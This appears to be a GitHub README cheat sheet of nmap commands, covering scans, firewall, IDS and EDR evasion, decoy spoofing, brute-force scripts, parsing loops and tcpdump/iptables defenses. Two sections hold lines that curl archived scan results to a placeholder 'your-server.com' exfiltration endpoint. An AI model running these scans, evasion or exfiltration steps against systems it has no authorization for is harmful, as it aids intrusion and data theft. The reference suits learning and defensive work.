# Nmap-dictionary
Nmap commands from beginner level to advanced level that are categorized in the most simple way 

> 📄 **Quick Reference:** [One-page cheat sheet](QUICKREF.md) for the most common commands.

## 📖 Table of Contents

1. [The Fundamentals](#1-the-fundamentals)

2. [Network Discovery](#2-network-discovery)

3. [Stealth and Evasion](#3-stealth-and-evasion)

4. [Advanced Scanning Technique](#4-advanced-scanning-technique)

5. [Service and Vulnerability Discovery](#5-service-and-vulnerability-discovery)

6. [Output and Exfiltration](#6-output-and-exfiltration)

7. [Timing and Performance](#7-timing-and-performance)

8. [Exfiltration and Post-Processing](#8-exfiltration-and-post-processing)

9. [Target-Specific Commands](#9-target-specific-commands)

10. [Aggressive Commands](#10-aggressive-commands)

11. [IPv6 Scanning](#11-ipv6-scanning)

12. [Firewall Evasion](#12-firewall-evasion)

13. [NSE Script Development](#13-nse-script-development)

14. [Advanced Output Parsing](#14-advanced-output-parsing-1000-hosts)

15. [Scan Automation](#15-scan-automation-multiple-networks)

16. [Defense (Identifying Enemies)](#16-defense-identifying-enemies)

17. [Evading Modern EDR](#17-evading-modern-edr)






   ## 1. THE FUNDAMENTALS
 
  - Quick port scan with version detection
nmap -sV -T4 192.168.1.1

- Full port scan (slow but thorough)
nmap -p- -sV -T4 192.168.1.1

- Aggressive scan (OS, version, scripts, traceroute)
nmap -A -T4 192.168.1.1

- UDP scan (find DNS, SNMP, other non‑TCP services)
 nmap -sU 192.168.1.1

- Save everything (normal, XML, grepable)
nmap -oA scan_name -A -T4 192.168.1.0/24 
   
[🔝 Back to Top](#📖-table-of-contents)


   ## 2. NETWORK DISCOVERY 

- Ping sweep - find live hosts
nmap -sn 192.168.1.0/24

- ARP ping (works even when ICMP is blocked, needs root)
nmap -sn -PR 192.168.1.0/24

- TCP SYN ping (bypasses firewall rules)
nmap -sn -PS 443,80 192.168.1.0/24

- Fast host discovery with traceroute
nmap -sn --traceroute 192.168.1.0/24

[🔝 Back to Top](#📖-table-of-contents)


  ##  3. STEALTH AND EVASION
        
- Sneaky scan (slow, hard to detect)
nmap -T1 -sS 192.168.1.1

- Decoy scan (hide your IP among 10 random hosts)
nmap -D RND:10 -sS 192.168.1.1

- Fragment packets (evade simple firewalls)
nmap -f -sS 192.168.1.1

- MAC spoofing (needs root)
nmap --spoof-mac 0 192.168.1.1

- Source port manipulation (pretend to be DNS)
nmap --source-port 53 -sS 192.168.1.1

- Idle scan (use a zombie host, advanced)
nmap -sI zombie_ip 192.168.1.1

[🔝 Back to Top](#📖-table-of-contents)


   ## 4. ADVANCED SCANNING TECHNIQUE

- TCP Null scan (evade non-stateful firewalls)
nmap -sN 192.168.1.1

- TCP FIN scan
nmap -sF 192.168.1.1

- TCP Maimon scan
nmap -sM 192.168.1.1

- ACK scan (map firewall rules)
nmap -sA 192.168.1.1

- Window scan (same as ACK but better)
nmap -sW 192.168.1.1

- Custom packet scan 
nmap --scanflags SYN,URG 192.168.1.1

[🔝 Back to Top](#📖-table-of-contents)


   ## 5. SERVICE AND VULNERABILITY DISCOVERY 

- Version detection with intensity (0-9, higher is slower but deeper)
nmap -sV --version-intensity 9 192.168.1.1

- Service scan with default scripts
nmap -sC -T4 192.168.1.1

- Vulnerability scan (noisy, but effective)
nmap --script vuln -T4 192.168.1.1

- Specific vulnerability scripts
nmap --script http-vuln-*,smb-vuln-* -T4 192.168.1.1

- Brute force default credentials (dangerous) 
nmap --script brute 192.168.1.1

- SMTP open relay check
nmap --script smtp-open-relay -p 25 192.168.1.1

- DNS enumeration
nmap --script dns-recursion,dns-zone-transfer -p 53 192.168.1.0/24

[🔝 Back to Top](#📖-table-of-contents)


   ## 6. OUTPUT AND EXFILTRATION 

- Save all formats
nmap -oA scan_name 192.168.1.0/24

- Grepable output for scripting
nmap -oG scan.grep 192.168.1.0/24

- Extract IPs from scan
grep "Nmap scan report" scan.txt | awk '{print $5}' > live_hosts.txt

- Extract open ports
grep "open" scan.txt | awk '{print $1, $3}' > open_ports.txt

- For exfiltration: compress and send to your server
tar -czf scan_results.tar.gz scan.txt scan.xml scan.grep
curl -F "file=@scan_results.tar.gz" http://your-server.com/upload

[🔝 Back to Top](#📖-table-of-contents)


  ##  7. TIMING AND PERFORMANCE 

- Paranoid (0.1s delay, avoid IDS)
nmap -T0 -sS 192.168.1.1

- Sneaky (15s delay, still evasive)
nmap -T1 -sS 192.168.1.1

- Polite (0.4s delay, normal)
nmap -T2 -sS 192.168.1.1

- Normal (default)
nmap -T3 -sS 192.168.1.1

- Aggressive (fast, might drop packets)
nmap -T4 -sS 192.168.1.1

- Insane (very fast, likely to trigger alerts)
nmap -T5 -sS 192.168.1.1

- Max rate (overkill, for when you don't care about stealth)
nmap --min-rate 10000 -p- 192.168.1.1

[🔝 Back to Top](#📖-table-of-contents)


  ##  8. EXFILTRATION AND POST-PROCESSING 

- Step 1: Host discovery (fast)
nmap -sn 192.168.1.0/24 -oG live_hosts.grep

- Step 2: Extract IPs to file
grep "Up" live_hosts.grep | cut -d' ' -f2 > ip_list.txt

- Step 3: Deep scan each host
  while read ip; do
      nmap -sV -A -T4 "$ip" -oN "scan_${ip}.txt"
  done < ip_list.txt

- Step 4: Extract interesting data
grep -E "open|VERSION|OS" scan_*.txt > interesting_results.txt

- Step 5: Exfiltrate to your server 
tar -czf batch_scan.tar.gz scan_*.txt interesting_results.txt
curl -X POST -F "data=@batch_scan.tar.gz" http://your-server.com/exfil

[🔝 Back to Top](#📖-table-of-contents)


   ## 9. TARGET-SPECIFIC COMMANDS 

- Web server enumeration
nmap --script http-enum,http-headers,http-title -p 80,443,8080 192.168.1.1

- SMB enumeration (Windows networks)
nmap --script smb-os-discovery,smb-security-mode -p 445 192.168.1.0/24

- SSH enumeration
nmap --script ssh-auth-methods,ssh-hostkey -p 22 192.168.1.1

- FTP enumeration
nmap --script ftp-anon,ftp-bounce -p 21 192.168.1.1

- Database enumeration (MySQL, PostgreSQL, MongoDB)
nmap --script mysql-info,postgres-brute,mongodb-databases -p 3306,5432,27017 192.168.1.1

- SNMP enumeration (often forgotten)
nmap --script snmp-community,snmp-info -p 161 192.168.1.0/24

[🔝 Back to Top](#📖-table-of-contents)


## 10. AGGRESSIVE COMMANDS 

- Full aggressive on entire subnet
nmap -A -T4 -p- 192.168.1.0/24 -oA full_subnet_scan

- Vulnerability scan with maximum intensity
nmap --script vuln --script-args vulns.timeout=30s -T4 192.168.1.1

- Brute force default credentials on multiple services
nmap --script brute -p 21,22,23,80,443,445,3306,3389 192.168.1.1

- Fast port discovery + deep scan (two-pass)
nmap -p- --min-rate 10000 -T4 192.168.1.1 -oN fast_ports.txt
nmap -sV -A -p $(grep -E "^[0-9]" fast_ports.txt | cut -d'/' -f1 | tr '\n' ',') 192.168.1.1

[🔝 Back to Top](#📖-table-of-contents)


## 11. IP V6 SCANNING 
   
- IPv6 ping sweep (find live hosts)
nmap -6 -sn 2001:db8::/32

- IPv6 version scan
nmap -6 -sV -T4 2001:db8::1

- IPv6 full port scan (slow but thorough)
nmap -6 -p- -sV -T4 2001:db8::1

- IPv6 aggressive scan
nmap -6 -A -T4 2001:db8::1

- IPv6 traceroute
nmap -6 --traceroute 2001:db8::1

- IPv6 script scan
nmap -6 --script smb-os-discovery -p 445 2001:db8::1

- IPv6 firewall evasion (some firewalls don't inspect IPv6 properly)
nmap -6 -f -sS 2001:db8::1

[🔝 Back to Top](#📖-table-of-contents)


## 12. FIREWALL EVASION 

- Randomize host order (evade pattern-based detection)
nmap --randomize-hosts 192.168.1.0/24

- Append random data to packets (evade signature detection)
nmap --data-length 200 192.168.1.1

- Specify minimum TTL (evade TTL-based filters that drop packets with odd TTLs)
nmap --ttl 128 192.168.1.1

- Send bad checksums (some IDS systems ignore bad checksums, older systems process them)
nmap --badsum 192.168.1.1

- Use specific source IP (spoofing, requires root and network access)
nmap -S 10.10.10.10 -e eth0 192.168.1.1

- IP fragmentation with specific offset (evades older firewalls)
nmap -f --mtu 8 192.168.1.1

- SCTP scan (less common, often not monitored)
nmap -sY -T4 192.168.1.1

- Custom packet timing (evade rate-based detectors)
nmap --scan-delay 1s --max-retries 0 192.168.1.1
 
[🔝 Back to Top](#📖-table-of-contents)


## 13. NSE SCRIPT DEVELOPMENT 

- List all scripts by category
ls /usr/share/nmap/scripts/*.nse

- Search for scripts by keyword
grep -r "smb" /usr/share/nmap/scripts/

- Run a script with custom arguments
nmap --script smb-os-discovery --script-args smb-os-discovery.verbose=true 192.168.1.1

- Run a custom script 
nmap --script ./my_custom_script.nse 192.168.1.1

- Debug script execution
nmap --script-trace --script http-enum 192.168.1.1
  
---CUSTOM TEMPLATE 
  
  -- Place this in ~/.nmap/scripts/my_http_check.nse
local http = require "http"
local nmap = require "nmap"
local stdnse = require "stdnse"

portrule = function(host, port)
    return port.number == 80 and port.state == "open"
end

action = function(host, port)
    local path = "/admin"
    local response = http.get(host, port, path)
    if response.status == 200 then
        return string.format("Admin panel found at %s%s", host.ip, path)
    end
    return nil
end

[🔝 Back to Top](#📖-table-of-contents)


## 14. ADVANCED OUTPUT PARSING (+1000 HOSTS)

- Extract IP:port pairs from grepable output
grep -E "^Host:" scan.grep | cut -d' ' -f2,4 | tr ' ' ':' > ip_port_pairs.txt

- Generate a list of hosts with specific open ports
grep -E "^Host:.*80/open" scan.grep | cut -d' ' -f2 > web_hosts.txt

- Create CSV for reporting (for pentests)
echo "IP,Port,Service,Version" > report.csv
grep "open" scan.txt | awk '{print $1","$3","$4","$5}' >> report.csv

- Find hosts with a specific vulnerability
grep -B 2 "VULNERABLE" scan.txt | grep "Nmap scan report" | awk '{print $5}' > vulnerable_hosts.txt

- Generate unique list of services found
grep "open" scan.txt | awk '{print $3}' | sort | uniq -c | sort -rn > service_counts.txt

[🔝 Back to Top](#📖-table-of-contents)


## 15. Scan Automation (multiple networks)

- Scan multiple subnets from a list
  while read subnet; do
      nmap -sn "$subnet" -oG "scan_$(echo "$subnet" | tr '/' '_').grep"
  done < subnets.txt

- Scan all hosts from a list
while read ip; do
    nmap -sV -T4 "$ip" -oN "scan_${ip}.txt"
done < ip_list.txt

- Parallel scanning (faster, but more aggressive)
cat ip_list.txt | xargs -I {} -P 5 nmap -sV -T4 {} -oN "scan_{}.txt"

- Scan based on open ports from previous scan
open_ports=$(grep "open" previous_scan.txt | cut -d'/' -f1 | sort -u | tr '\n' ',')
nmap -p "$open_ports" -sV -T4 192.168.1.0/24

[🔝 Back to Top](#📖-table-of-contents)


## 16. DEFENSE (identifying enemies)

- Detect SYN scans
tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0'

- Detect FIN scans
tcpdump -i eth0 'tcp[tcpflags] & (tcp-fin) != 0'

- Detect XMAS scans (FIN, URG, PSH)
tcpdump -i eth0 'tcp[tcpflags] & (tcp-fin|tcp-urg|tcp-psh) == (tcp-fin|tcp-urg|tcp-psh)'

- Detect NULL scans
tcpdump -i eth0 'tcp[tcpflags] == 0'

- Detect fragmented packets (evasion attempt)
tcpdump -i eth0 'ip[6:2] & 0x1fff != 0'

- Rate-limit ICMP ping sweeps (prevent discovery)
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/second --limit-burst 5 -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

- Rate-limit TCP scans (prevent port scanning)
iptables -A INPUT -p tcp --syn -m recent --name portscan --set -j DROP
iptables -A INPUT -p tcp --syn -m recent --name portscan --rcheck --seconds 60 --hitcount 10 -j DROP

- Log and drop scanners
iptables -A INPUT -p tcp --syn -m recent --name portscan --rcheck --seconds 60 --hitcount 10 -j LOG --log-prefix "PORT_SCAN: "
iptables -A INPUT -p tcp --syn -m recent --name portscan --rcheck --seconds 60 --hitcount 10 -j DROP

[🔝 Back to Top](#📖-table-of-contents)


## 17. EVADING MODERN EDR

- Slow down to avoid behavioral detection
nmap -T1 --max-retries 0 --min-rtt-timeout 1000 192.168.1.1

- Randomize scan order (evade pattern-based alerts)
nmap --randomize-hosts 192.168.1.0/24

- Use non-standard ports (many EDR solutions only monitor common ports)
nmap -sS -p 8080,8443,4443 192.168.1.1

- Spread scan over time (avoid real-time detection)
nmap -T0 --scan-delay 30s -p 1-1000 192.168.1.1

- Use decoy scans from legitimate IPs
nmap -D 8.8.8.8,1.1.1.1,ME 192.168.1.1
